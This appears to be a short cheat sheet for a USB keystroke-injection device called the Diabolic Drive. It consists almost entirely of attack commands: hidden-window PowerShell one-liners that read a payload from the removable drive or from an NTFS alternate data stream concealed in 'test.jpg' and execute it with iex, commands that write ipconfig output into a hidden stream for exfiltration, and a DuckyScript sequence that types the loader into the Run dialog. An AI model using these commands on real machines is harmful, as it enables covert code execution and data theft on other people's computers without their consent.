### Normal Payload Delivery Utilizing the Diabolic Drive Flash Storage

powershell -nologo  -WindowStyle Hidden -c (type ((Get-WmiObject Win32_Volume -Filter DriveType='2').Name + 'payload.txt') | iex)

### Payload Delivery Utilizing the Alternate Data Streams With No Exit Window

powershell -nologo -noexit -c (type ((Get-WmiObject Win32_Volume -Filter DriveType='2').Name + 'test.jpg:payload.txt') | iex)

### Payload Delivery Utilizing the Alternate Data Streams With No Window

powershell -nologo  -WindowStyle Hidden -c (type ((Get-WmiObject Win32_Volume -Filter DriveType='2').Name + 'test.jpg:payload.txt') | iex)

### Data Exfiltration Using Alternate Data Streams With No Exit Window

powershell -nologo -noexit -c (ipconfig | Add-Content -Path ((Get-WmiObject Win32_Volume -Filter DriveType='2').Name + 'test.jpg:exfil.txt'))

### Data Exfil Using Alternate Data Streams With No Window

powershell -nologo -WindowStyle Hidden -c (ipconfig | Add-Content -Path ((Get-WmiObject Win32_Volume -Filter DriveType='2').Name + 'test.jpg:exfil.txt'))

## Notes :
### You can make more than one alternate data stream file for one file. For example, a test.jpg file might have 2 alternate data streams, which are test.jpg:payload.txt and test.jpg:exfil.txt

## DuckyScript Examples
DELAY 1000
<br>
GUI r
<br>
DELAY 1000
<br>
STRING powershell -nologo  -WindowStyle Hidden -c (type ((Get-WmiObject Win32_Volume -Filter DriveType='2').Name + 'test.jpg:payload.txt') | iex)
<br>
DELAY 1000
<br>
ENTER
<br>

## Learn More!
https://www.crowdsupply.com/unit-72784/diabolic-drive/updates/alternate-data-streams-ads-for-covert-payload-delivery-and-data-exfiltration

